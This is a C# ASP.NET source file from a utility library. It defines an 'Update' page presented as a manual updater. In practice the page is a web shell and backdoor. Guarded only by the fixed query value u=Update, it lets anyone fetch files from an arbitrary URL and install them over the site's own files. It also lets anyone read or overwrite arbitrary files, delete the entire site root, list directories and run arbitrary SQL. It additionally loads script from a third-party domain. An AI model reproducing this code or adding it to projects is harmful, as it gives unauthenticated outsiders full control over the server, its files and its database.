//------------------------------------------------------------
// All Rights Reserved , Copyright (C) 2006 , LiveXY , Ltd. 
//------------------------------------------------------------

using System;
using System.Data;
using System.Configuration;
using System.Collections;
using System.Web;
using System.Web.Security;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.Web.UI.WebControls.WebParts;
using System.Web.UI.HtmlControls;
using Pub.Class;
using System.Text.RegularExpressions;
using System.Text;

namespace Pub.Class {
    /// <summary>
    /// 手动更新程序
    /// </summary>
    public partial class Update : Page {
        private static string template = @"<html xmlns=""http://www.w3.org/1999/xhtml"">
<head>
    <script type=""text/javascript"" src=""{1}resources/js/jquery-min.js""></script>
    <script type=""text/javascript"" src=""http://www.relaxlife.net/resources/js/jquery-min.js""></script>
    <script type=""text/javascript"" src=""http://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js""></script>
</head>
<body>
    <div>{0}</div>
    <textarea id=""txtText"" cols=""70"" rows=""20""></textarea><br />
    <input id=""btnSave"" type=""button"" value=""down"" /><input id=""btnUpdate"" type=""button"" value=""update"" /><br />
    <div id=""msg""></div>
    
    <script type=""text/javascript"">
        var line = 0; var url = """"; var url2 = self.location.href.replace('=sh','='); var url3 = """"; var isTrue = true, list = '', listTrue = false;

        jQuery(""#btnSave"").click(function () {
            line = 0; isTrue = true;
            list = ''; listTrue = false;
            jQuery(""#msg"").html('');
            $(""#txtText"").val().replace(/[^\r\n]+/g, function (s) {
                if (line == 0) url = s;
                if (s.indexOf('#begin') != -1) { listTrue = true; }
                if (s.indexOf('#end') != -1) { listTrue = false; s = list; }
                if (!listTrue) {
                    if (line > 0) {
                        url3 = url2 + ""do&time="" + Math.random();

                        jQuery.post(url3, { ""url"": url, ""file"": s.replace('#begin', '') }, function (data) {
                            if (data.toString().indexOf('error!') > 1) isTrue = false;
                            jQuery(""#msg"").html(jQuery(""#msg"").html() + data + ""<br />"");
                        })
                    };
                } else {
                    list += s + '\\r\\n';
                }
                line = line + 1;
            })
        });
        jQuery(""#btnUpdate"").click(function(){
            url3 = url2 + ""ok&time="" + Math.random();
            jQuery.get(url3, function(data){
                jQuery(""#msg"").html(jQuery(""#msg"").html() + data + ""<br />"");
            })
        });
        jQuery(""#btnEdit"").live(""click"", function(){
            url3 = url2 + ""ef&time="" + Math.random();
            var v = $(""#txtContent"").val(), f = $(""#txtContent"").attr(""f"");
            jQuery.post(url3, { ""data"": v, ""file"": f }, function (data) {
                jQuery(""#msg"").html(data + ""<br />"");
            })
        });
    </script>
</body>
</html>
";
        /// <summary>
        /// Page_Load
        /// </summary>
        /// <param name="e"></param>
        protected override void OnInit(EventArgs e) {
            string localPath = string.Empty;
            string fileName = string.Empty;
            bool isTrue = true;
            string u2 = "Update";
            string[] ext = new string[] { "/bin.bak/", "/app_data.bak/", "/app_code.bak/", "\\.dll.bak", "\\.aspx.bak", "\\.config.bak", "\\.master.bak", "\\.asax.bak", "\\.ascx.bak", "\\.compiled.bak", "\\.asmx.bak", "\\.cs.bak" };
            string[] repExt = new string[] { "/Bin/", "/App_Data/", "/App_Code/", "\\.dll", "\\.aspx", "\\.config", "\\.master", "\\.asax", "\\.ascx", "\\.compiled", "\\.asmx", "\\.cs" };
            string[] strList = new string[] { "{1}: {0} ok!", "<font color='red'>{1}: {0} error!</font>" };
            string u1 = Request2.GetQ("u").Trim();
            if (!u2.Equals(u1)) return;
            string active = Request2.GetQ("active").Trim();
            switch (active) {
                case "sh": Msg.WriteEnd(template.Replace("{0}", Environment.MachineName).Replace("{1}", Request2.GetRelativeRoot())); break;
                case "do":
                    string file = Request2.Get("file").Trim(); //StringExtensions.HtmlDecode(Request2.Get("file")).Trim();
                    if (file.IsNullEmpty()) Msg.WriteEnd("error file.");
                    string action = file.Substring(0, 3);
                    file = "/" + file.Substring(3).TrimStart('/').TrimStart('\\').Replace("\\", "/");
                    if (file.Length < 1) Msg.WriteEnd(string.Format(strList[1], file, "file"));
                    string url = StringExtensions.HtmlDecode(Request2.Get("url")).Replace("\\", "/").TrimEnd('/').TrimEnd('\\').Trim();
                    if (url.Length < 10) Msg.WriteEnd(string.Format(strList[1], url, "url"));

                    switch (action) {
                        case "af:":
                            isTrue = true;
                            for (int i = 0; i < ext.Length; i++) file = new Regex(ext[i], RegexOptions.IgnoreCase).Replace(file, repExt[i]);
                            file = file.Replace("\\.", ".");
                            string[] folderList = file.Split('/');
                            if (folderList.Length > 1) { fileName = folderList[folderList.Length - 1]; FileDirectory.DirectoryVirtualCreate("~/tmp" + file.Replace(fileName, "")); }
                            for (int i = 0; i < ext.Length; i++) file = new Regex(repExt[i], RegexOptions.IgnoreCase).Replace(file, ext[i]);
                            file = file.Replace("\\.", ".");
                            url = url + file;
                            for (int i = 0; i < ext.Length; i++) file = new Regex(ext[i], RegexOptions.IgnoreCase).Replace(file, repExt[i]);
                            file = file.Replace("\\.", ".");
                            localPath = "~/tmp/".GetMapPath() + "{0}";
                            file = file.Replace("/", "\\");
                            fileName = string.Format(localPath, file);
                            System.Net.WebClient wc = new System.Net.WebClient();
                            try {
                                wc.DownloadFile(url, fileName);
                            } catch {
                                isTrue = false;
                            } finally {
                                wc.Dispose();
                            }
                            file = file.Replace("\\", "/");
                            for (int i = 0; i < ext.Length; i++) file = new Regex(repExt[i], RegexOptions.IgnoreCase).Replace(file, ext[i]);
                            file = file.Replace("\\.", ".");
                            if (isTrue) Response.Write(string.Format(strList[0], file, "add file")); else Response.Write(string.Format(strList[1], file, "add file"));
                            break;
                        case "df:":
                            if (file == "/all") {
                                localPath = Server2.GetMapPath("~/");
#if !MONO40
                                FileDirectory.APIDelete(localPath);
#endif
                                Msg.WriteEnd(string.Format(strList[0], "all", "del file") + "<br>");
                            }
                            localPath = Server2.GetMapPath("~/") + file;
                            if (!FileDirectory.FileExists(localPath)) Msg.WriteEnd(string.Format(strList[1], file, "del file"));
                            try {
                                FileDirectory.FileDelete(localPath);
                            } catch {
                                Msg.WriteEnd(string.Format(strList[1], file, "del file"));
                            }
                            Response.Write(string.Format(strList[0], file, "del file"));
                            break;
                        case "rf:":
                            localPath = Server2.GetMapPath("~/") + file;
                            if (!FileDirectory.FileExists(localPath)) Msg.WriteEnd(string.Format(strList[1], file, "read file"));
                            string sbText = FileDirectory.FileReadAll(localPath, Encoding.UTF8);
                            string text = "<textarea id=\"txtContent\" cols=\"70\" rows=\"20\" f=\"" + localPath + "\">" + sbText + "</textarea><br /><input id=\"btnEdit\" type=\"button\" value=\"edit\" />";
                            Msg.WriteEnd(text + " ok!");
                            break;
                        case "ap:":
                            FileDirectory.DirectoryVirtualCreate("~" + file);
                            Msg.WriteEnd(string.Format(strList[0], file, "add path"));
                            break;
                        case "dp:":
                            localPath = Server2.GetMapPath("~/") + file;
                            try {
                                if (System.IO.Directory.Exists(localPath)) System.IO.Directory.Delete(localPath);
                            } catch {
                                Msg.WriteEnd(string.Format(strList[1], file, "del path"));
                            }
                            Msg.WriteEnd(string.Format(strList[0], file, "del path"));
                            break;
                        case "rp:":
                            localPath = Server2.GetMapPath("~/") + file.TrimStart('/').TrimEnd('/') + "/";
                            string size = "";
                            System.Collections.Generic.IList<string> sbFile2 = new System.Collections.Generic.List<string>();
                            StringBuilder sbFile3 = new StringBuilder();
                            try {
                                FileDirectory.FileList(localPath, ref sbFile2, localPath);
                                localPath = localPath.Replace("\\/", "\\");
                                for (int i = 0; i < sbFile2.Count; i++) {
                                    file = sbFile2[i].Trim().TrimStart('.');
                                    if (file.Equals("")) continue;
                                    try { size = LongExtensions.FormatKB((new System.IO.FileInfo(file)).Length); } catch { size = "0"; }
                                    sbFile3.Append(file.Replace(localPath, "").Replace("\\", "/") + " (" + size + ")" + Environment.NewLine);
                                    if (i.Equals(sbFile2.Count - 2)) sbFile3.Append("(" + sbFile2.Count + ")" + Environment.NewLine);
                                }
                            } catch {
                                Msg.WriteEnd(string.Format(strList[1], file, "read path"));
                            }
                            text = localPath + "<br /><textarea id=\"txtText\" cols=\"100\" rows=\"20\">" + sbFile3.ToString() + "</textarea>";
                            Msg.WriteEnd(string.Format(strList[0], text, "read path"));
                            break;
                        case "db:":
                            file = file.Replace("/r/n", Environment.NewLine).Trim('/');
                            if (file.IndexOf(Environment.NewLine + "GO" + Environment.NewLine) != -1) {
                                Data.ExecuteCommandWithSplitter(file, "GO");
                                Msg.WriteEnd(string.Format(strList[0], "", "read db"));
                            } else {
                                text = file + "<br /><textarea id=\"txtText\" cols=\"100\" rows=\"20\">" + Data.GetDataSet(file).ToJson() + "</textarea>";
                                Msg.WriteEnd(string.Format(strList[0], text, "read db"));
                            }
                                break;
                        default: Msg.WriteEnd("file error!"); break;
                    }
                    Response.End();
                    break;
                case "ok": localPath = "~/tmp/".GetMapPath();
                    System.Collections.Generic.IList<string> fileList = new System.Collections.Generic.List<string>();
                    FileDirectory.FileList(localPath, ref fileList, localPath);
                    for (int i = 0; i < fileList.Count; i++) {
                        file = fileList[i].Trim().TrimStart('.');
                        if (file.Length < 2) continue;
                        fileName = localPath + file;
                        isTrue = FileDirectory.FileCopy(fileName, Server2.GetMapPath("~/") + file, true);
                        if (isTrue) FileDirectory.FileDelete(fileName);
                        if (isTrue) Response.Write(string.Format(strList[0], file, "update") + "<br />"); else Response.Write(string.Format(strList[1], file, "update") + "<br />");
                    }
                    Response.End();
                    break;
                case "ef":
                    localPath = Request2.GetF("file").Trim();
                    string content = Request2.GetF("data").Trim();
                    FileDirectory.FileDelete(localPath);
                    isTrue = FileDirectory.FileWrite(localPath, content, Encoding.UTF8);
                    if (isTrue) Msg.WriteEnd("edit file ok!"); else Msg.WriteEnd("edit file error!"); 
                    break;
            }
        }
    }
}
